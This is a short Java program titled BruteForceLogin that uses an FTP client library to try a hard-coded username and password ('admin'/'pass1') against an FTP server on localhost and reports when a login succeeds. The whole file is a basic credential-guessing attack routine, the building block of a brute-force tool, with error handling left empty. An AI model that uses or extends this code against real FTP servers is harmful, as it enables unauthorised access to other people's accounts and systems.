import org.apache.commons.net.ftp.FTPClient;
import java.io.IOException;

public class BruteForceLogin {

    public static void bruteForceLogin(String hostname, String userName, String passWord) {
        System.out.println("[+] Trying: " + userName + "/" + passWord);
        FTPClient ftp = new FTPClient();
        try {
            ftp.connect(hostname);
            boolean loggedIn = ftp.login(userName, passWord);
            if (loggedIn) {
                System.out.println("FTP Login succeeded: " + userName + "/" + passWord);
                ftp.logout();
            }
        } catch (IOException e) {
            // Handle exception
        } finally {
            if (ftp.isConnected()) {
                try {
                    ftp.disconnect();
                } catch (IOException e) {
                    // Handle exception
                }
            }
        }
    }

    public static void main(String[] args) {
        String userName = "admin";
        String passWord = "pass1";
        String hostName = "127.0.0.1";
        bruteForceLogin(hostName, userName, passWord);
    }
}
